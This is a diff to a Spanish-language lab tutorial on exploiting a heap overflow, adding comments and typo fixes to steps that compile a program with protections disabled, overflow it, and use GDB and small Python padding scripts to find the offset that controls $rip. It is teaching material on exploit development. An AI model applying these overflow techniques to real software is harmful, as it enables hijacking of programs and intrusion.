@@ -9,16 +9,16 @@ Compilamos y corremos el programa:
 ```
 gcc heapOverflow.c -o heapOverflow.o -w -g -no-pie -z execstack
 ./heapOverflow.o Hola
-./heapOverflow.o XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX (+64 characters)
+./heapOverflow.o XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX    #(+64 characters)
 ```
 ![Step1-Commands](imgs/step1_heap.png "Run commands")
 
 ## Paso 2
 Mediante el uso del debugger GDB, observamos el funcionamiento de nuestro programa:
 ```
-gdb ./heapOverflow.o
-(gdb) list 25,40
-(gdb) b 38
+gdb ./heapOverflow.o    #Corremos GDB
+(gdb) list 47,60        #Listamos el código de las líneas 47 a 60
+(gdb) b 59              #Ponemos un breakpoint en la línea 59
 ```
 ![Step2-Commands](imgs/step2_gdb_list.png "GDB list")
 
@@ -55,7 +55,7 @@ chmod a+x python1.py
 ![Step3-Commands](imgs/step3_python.png "Python script")
 
 ## Paso 4
-Comprobamos el estado del registro $rip (instruction pointer).Primero, creamos un nuevo exploit, para cargar menos caracteres (80 en total):
+Comprobamos el estado del registro $rip (instruction pointer). Primero, creamos un nuevo exploit, para cargar menos caracteres (80 en total):
 ```python
 #!/usr/bin/python
 print("X"*70 + "YAYBYCYDYEYFYG")
@@ -68,16 +68,17 @@ gdb -q ./heapOverflow.o    #-q para que no muestre el banner de bienvenida
 (gdb) q                 #Salimos del debugger
 (gdb) y                 #Para confirmar la salida de gdb
 ```
-Observamos el valor de rip: GYFY -> 0x47594659
+Observamos el valor de $rip: GYFY -> 0x47594659
+
 ![Step4-Commands](imgs/step4_gdb_python2.png "GDB registers")
 
-No obstante, este enfoque acabaría por pisar la memoria, por lo que no podremos ver el registro. POr eso es mejor realizar lo siguiente:
+No obstante, este enfoque acabaría por pisar la memoria, por lo que no podremos ver el registro. Por eso es mejor realizar lo siguiente:
 ```python
 #!/usr/bin/python
 print("X"*80 + "CDEF")
 ```
 
-Procedemos como anteriormente y observamos el valor de rip: CDEF -> 0x46454443
+Procedemos como anteriormente y observamos el valor de $rip: CDEF -> 0x46454443
 
 ![Step4-Commands](imgs/step4_gdb_python3.png "GDB registers")
 
